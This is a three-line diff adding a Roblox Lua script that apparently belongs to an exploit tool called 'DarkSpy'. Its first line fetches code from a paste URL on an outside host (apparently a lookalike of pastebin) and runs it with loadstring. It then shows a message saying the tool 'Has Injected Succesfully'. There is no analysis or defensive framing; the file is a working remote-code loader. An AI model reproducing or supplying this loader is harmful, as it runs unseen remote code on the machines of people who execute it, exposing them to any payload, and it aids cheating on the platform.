@@ -1,0 +1,3 @@
+local notis = loadstring(game:HttpGet('https://pastebinp.com/raw/Gpxq9YKK'))()
+
+notis:Notify('DarkSpy', 'DarkSpy Has Injected Succesfully.', 5, Color3.fromRGB(255, 255, 255))
